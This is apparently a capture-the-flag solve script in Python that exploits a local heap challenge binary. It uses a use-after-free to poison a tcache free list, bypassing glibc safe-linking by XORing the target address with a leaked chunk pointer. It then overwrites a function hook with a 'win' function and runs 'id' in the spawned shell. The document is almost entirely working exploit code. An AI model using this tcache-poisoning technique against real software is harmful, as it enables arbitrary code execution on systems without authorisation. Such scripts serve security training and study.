#!/usr/bin/env python3
import re
import struct
import subprocess
import time

BIN = './chall'

def p64(x):
    return struct.pack('<Q', x)

p = subprocess.Popen([BIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

def ru(token: bytes) -> bytes:
    data = b''
    while token not in data:
        c = p.stdout.read(1)
        if not c:
            raise EOFError(data.decode('latin1', 'ignore'))
        data += c
    return data

def sl(x):
    if isinstance(x, str):
        x = x.encode()
    p.stdin.write(x + b'\n')
    p.stdin.flush()

def raw(x: bytes):
    p.stdin.write(x)
    p.stdin.flush()

def menu(choice: int):
    ru(b'> ')
    sl(str(choice))

def alloc(idx: int, size: int, data: bytes):
    menu(1)
    ru(b'idx: '); sl(str(idx))
    ru(b'size: '); sl(hex(size))
    ru(b'data: '); raw(data.ljust(size, b'A'))

def free(idx: int):
    menu(2)
    ru(b'idx: '); sl(str(idx))

def edit(idx: int, data: bytes, size: int = 0x40):
    menu(3)
    ru(b'idx: '); sl(str(idx))
    ru(b'data: '); raw(data.ljust(size, b'B'))

def inspect(idx: int) -> int:
    menu(5)
    ru(b'idx: '); sl(str(idx))
    out = ru(b'qword[1]') + p.stdout.readline()
    return int(re.search(rb'ptr\s+= (0x[0-9a-f]+)', out).group(1), 16)

def addresses():
    menu(7)
    out = ru(b'note:') + p.stdout.readline()
    target = int(re.search(rb'target_hook @ (0x[0-9a-f]+)', out).group(1), 16)
    win = int(re.search(rb'win_hook\s+@ (0x[0-9a-f]+)', out).group(1), 16)
    return target, win

target_hook, win_hook = addresses()
print(f'[+] target_hook = {target_hook:#x}')
print(f'[+] win_hook    = {win_hook:#x}')

# Prepare tcache list for size class 0x50: chunk1 -> chunk0.
alloc(0, 0x40, b'A')
alloc(1, 0x40, b'B')
free(0)
free(1)

chunk1 = inspect(1)
encoded_next = target_hook ^ (chunk1 >> 12)
print(f'[+] freed chunk = {chunk1:#x}')
print(f'[+] encoded next = {encoded_next:#x}')

# UAF write into chunk1->next.
edit(1, p64(encoded_next))

# First malloc returns chunk1. Second malloc returns target_hook.
alloc(2, 0x40, b'C')
alloc(3, 0x40, p64(win_hook))

# Trigger overwritten hook.
menu(6)
ru(b'message: ')
sl('owned')

# Demonstrate shell command execution, then exit the shell.
sl('id')
sl('exit')
time.sleep(0.2)
p.kill()
print(p.stdout.read(4096).decode('latin1', 'ignore'))
